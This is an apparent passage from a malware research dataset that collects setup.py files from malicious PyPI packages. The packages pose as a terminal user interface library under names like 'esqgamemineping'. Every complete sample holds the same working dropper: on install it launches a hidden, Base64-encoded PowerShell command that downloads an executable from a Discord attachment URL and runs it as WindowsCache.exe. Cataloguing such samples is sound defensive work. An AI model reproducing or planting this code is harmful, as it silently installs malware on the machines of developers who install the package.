Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqencodegameproof-v6.69",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqencodegameproof',\n    packages = ['modlib'],\n    version = '3.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqgamemineping-v1.6",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgamemineping',\n    packages = ['modlib'],\n    version = '2.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqgamereplacetool-v8.91",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgamereplacetool',\n    packages = ['modlib'],\n    version = '3.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqgetultragui-v5.56",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgetultragui',\n    packages = ['modlib'],\n    version = '7.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqhttppaypalurl-v4.13",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqhttppaypalurl',\n    packages = ['modlib'],\n    version = '9.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqinfovirtualgame-v3.2",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqinfovirtualgame',\n    packages = ['modlib'],\n    version = '5.40',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqkillpongrand-v2.94",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqkillpongrand',\n    packages = ['modlib'],\n    version = '5.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqloadhackednvidia-v4.86",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqloadhackednvidia',\n    packages = ['modlib'],\n    version = '9.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqmaskcpustring-v10.12",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmaskcpustring',\n    packages = ['modlib'],\n    version = '9.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqmaskintlib-v2.39",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmaskintlib',\n    packages = ['modlib'],\n    version = '6.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqmaskintnvidia-v7.65",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmaskintnvidia',\n    packages = ['modlib'],\n    version = '10.34',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqmaskvirtualcpu-v10.12",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmaskvirtualcpu',\n    packages = ['modlib'],\n    version = '7.53',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqmineosintpip-v2.47",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmineosintpip',\n    packages = ['modlib'],\n    version = '5.64',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqnvidiaultrapep-v7.81",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqnvidiaultrapep',\n    packages = ['modlib'],\n    version = '4.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 